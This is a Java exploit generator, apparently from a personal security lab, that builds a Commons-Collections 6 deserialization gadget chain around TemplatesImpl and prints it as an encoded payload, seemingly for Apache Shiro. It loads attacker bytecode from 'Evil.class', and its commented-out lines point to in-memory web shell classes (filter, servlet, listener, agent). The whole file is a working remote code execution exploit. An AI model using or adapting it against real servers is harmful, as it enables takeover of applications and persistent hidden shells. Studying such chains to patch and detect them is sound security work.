import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import sun.misc.BASE64Decoder;
import sun.misc.BASE64Encoder;

import java.io.*;
import java.lang.reflect.Field;
import java.net.URLEncoder;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC6Shiro {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "name");

        byte[] code = Files.readAllBytes(Paths.get("D:\\CCchain\\target\\classes\\Evil.class"));
//        byte[] code = Files.readAllBytes(Paths.get("D:\\MemoryShellLab\\MemShell\\src\\main\\java\\com\\exp\\EvilFilter.class"));
//        byte[] code = Files.readAllBytes(Paths.get("D:\\MemoryShellLab\\MemShell\\src\\main\\java\\com\\exp\\EvilServlet.class"));
//        byte[] code = Files.readAllBytes(Paths.get("D:\\MemoryShellLab\\MemShell\\target\\classes\\com\\exp\\EvilListener.class"));
//        byte[] code = Files.readAllBytes(Paths.get("D:\\MemoryShellLab\\MemShell\\target\\classes\\com\\exp\\EvilAttach.class"));
        byte[][] codes = {code};
        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, codes);

        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", null, null);

        Map<Object, Object> map = new HashMap<>();
        Map lazyMap = (Map) LazyMap.decorate(map, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, templates);
        Map<Object, Object> hashMap = new HashMap<>();

        hashMap.put(tiedMapEntry, "value");
        lazyMap.remove(templates);

        Class cls = LazyMap.class;
        Field factory = cls.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazyMap, invokerTransformer);

        String s = serialize(hashMap);
//        deserialize(s);
    }

    public static String serialize(Object obj) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        String output = new BASE64Encoder().encode(byteArrayOutputStream.toByteArray());
        System.out.println(URLEncoder.encode( output, "UTF-8" ));
        return output;
    }

    public static Object deserialize(String input) throws IOException, ClassNotFoundException {
        byte[] bytes = new BASE64Decoder().decodeBuffer(input);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        Object obj = objectInputStream.readObject();
        return obj;
    }
}
